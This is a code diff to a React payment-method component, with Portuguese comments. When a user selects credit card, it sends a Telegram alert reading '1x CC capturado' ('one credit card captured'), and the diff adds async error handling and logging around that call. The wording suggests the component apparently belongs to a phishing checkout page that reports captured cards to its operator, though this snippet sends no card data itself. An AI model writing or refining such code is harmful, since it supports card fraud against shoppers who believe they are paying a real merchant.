@@ -36,9 +36,18 @@ export const PaymentMethodContent: React.FC<PaymentMethodContentProps> = ({
   
   // Enviar notificação quando o usuário selecionar cartão de crédito
   useEffect(() => {
-    if (paymentMethod === 'creditCard') {
-      sendTelegramNotification('📲 1x CC capturado');
-    }
+    const sendNotification = async () => {
+      if (paymentMethod === 'creditCard') {
+        try {
+          await sendTelegramNotification('📲 1x CC capturado (método de pagamento)');
+          console.log('Telegram notification sent on credit card method selection');
+        } catch (error) {
+          console.error('Error sending notification on payment method select:', error);
+        }
+      }
+    };
+    
+    sendNotification();
   }, [paymentMethod]);
   
   return (
